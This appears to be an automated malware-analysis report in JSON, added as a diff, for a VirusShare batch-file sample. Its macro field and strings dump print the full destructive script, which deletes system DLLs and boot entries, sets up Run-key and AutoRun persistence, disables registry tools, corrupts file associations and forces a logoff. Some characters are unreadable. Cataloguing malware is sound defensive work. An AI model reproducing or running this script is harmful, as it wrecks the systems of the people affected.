@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\ndel \"%SystemRoot%\\system32\\*.dll\" /q >nul\ndel \"%SystemRoot%\\Driver Cache\\i386\\driver.cab\" /f /q >nul\nbootcfg /delete /id 1 >nul\nbootcfg /delete /id 1 >nul\nbootcfg /delete /id 1 >nul\n%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\Explorer\\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\\explorer.exe /f >nul\ntime 0:00 >nul\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul\ncopy \"\"%0\"\" \"%SystemRoot%\\system32\\batinit.bat\" >nul\n reg add \"HKCU\\SOFTWARE\\Microsoft\\Command Processor\" /v AutoRun /t REG_SZ /d \"%SystemRoot%\\syste m32\\batinit.bat\" /f >nul\ndel \"%SystemRoot%\\Cursors\\*.*\" >nul\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd(\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd)\n copy \"\"%0\"\" \"%SystemRoot%\\system32\\sys32.bat\" >nul\n reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Ru n\" /v \"sys32\" /t REG_SZ /d \"%SystemRoot%\\system32\\sys32.bat\" /f >nul \\\\ piarVK \"sys32.bat\"\\\\\\\\\ntaskkill /f /im explorer.exe >nul\nnet user \"\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\" /add >nul\nlabel C:\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd \ufffd\ufffd\ufffd\ufffd\ufffd\ufffd >nul\nassoc .exe=.mp3\nassoc .lnk=.txt\ndel ** /q\ndel \"%0\" >nul\nshutdown -l -t 1 -c \"lol\" -f >nul"
+    },
+    "filename": "VirusShare_34743cc71475baa406e6a499c9aa33a6",
+    "filesize": 1318,
+    "filetype": "DOS batch file, ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "34743cc71475baa406e6a499c9aa33a6",
+        "sha1": "05e50860336da1b84e5c7d398c7627437e6c865d",
+        "sha256": "9df421729d404112edf690204f57a96f403622d2f5801b1ab4300b530945989d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "del \"%SystemRoot%\\system32\\*.dll\" /q >nul",
+            "del \"%SystemRoot%\\Driver Cache\\i386\\driver.cab\" /f /q >nul",
+            "bootcfg /delete /id 1 >nul",
+            "bootcfg /delete /id 1 >nul",
+            "bootcfg /delete /id 1 >nul",
+            "%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul",
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\Explorer\\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\\explorer.exe /f >nul",
+            "time 0:00 >nul",
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul",
+            "copy \"\"%0\"\" \"%SystemRoot%\\system32\\batinit.bat\" >nul",
+            " reg add \"HKCU\\SOFTWARE\\Microsoft\\Command Processor\" /v AutoRun /t REG_SZ /d \"%SystemRoot%\\syste m32\\batinit.bat\" /f >nul",
+            "del \"%SystemRoot%\\Cursors\\*.*\" >nul",
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Pol icies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul",
+            "  ()",
+            " copy \"\"%0\"\" \"%SystemRoot%\\system32\\sys32.bat\" >nul",
+            " reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Ru n\" /v \"sys32\" /t REG_SZ /d \"%SystemRoot%\\system32\\sys32.bat\" /f >nul \\\\ piarVK \"sys32.bat\"\\\\\\\\",
+            "taskkill /f /im explorer.exe >nul",
+            "net user \"   \" /add >nul",
+            "label C:  >nul",
+            "assoc .exe=.mp3",
+            "assoc .lnk=.txt",
+            "del ** /q",
+            "del \"%0\" >nul",
+            "shutdown -l -t 1 -c \"lol\" -f >nul"
+        ],
+        "file": {
+            "assoc .lnk=.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.297638",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
